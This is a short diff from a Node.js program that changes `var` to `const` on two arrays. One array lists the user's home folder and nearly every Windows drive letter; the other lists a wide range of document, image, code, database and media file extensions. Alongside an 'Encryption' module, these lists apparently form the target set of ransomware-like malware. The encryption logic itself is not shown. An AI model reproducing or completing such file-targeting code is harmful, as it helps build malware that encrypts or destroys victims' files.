@@ -4,14 +4,14 @@ const fs = require('fs');
 const Search = require('./Search');
 const Encryption = require('./Encryption');
 
-var virtualPartitions = ["C:\\Users\\" + os.userInfo().username,
+const virtualPartitions = ["C:\\Users\\" + os.userInfo().username,
                           "K:\\", "L:\\", "M:\\", "N:\\", "O:\\",
                           "D:\\", "A:\\", "B:\\", "F:\\", "Q:\\",
                           "G:\\", "H:\\", "R:\\", "S:\\", "J:\\",
                           "U:\\", "W:\\", "V:\\", "X:\\", "T:\\",
                           "Y:\\", "Z:\\", "E:\\", "P:\\", "I:\\"];
 
-var ext = [".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls",
+const ext = [".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls",
            ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".jpeg", ".gif", ".csv",
            ".py", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".htm",
            ".xml", ".psd", ".pdf", ".dll", ".c", ".cs", ".vb", ".mp3", ".mp4", ".f3d",
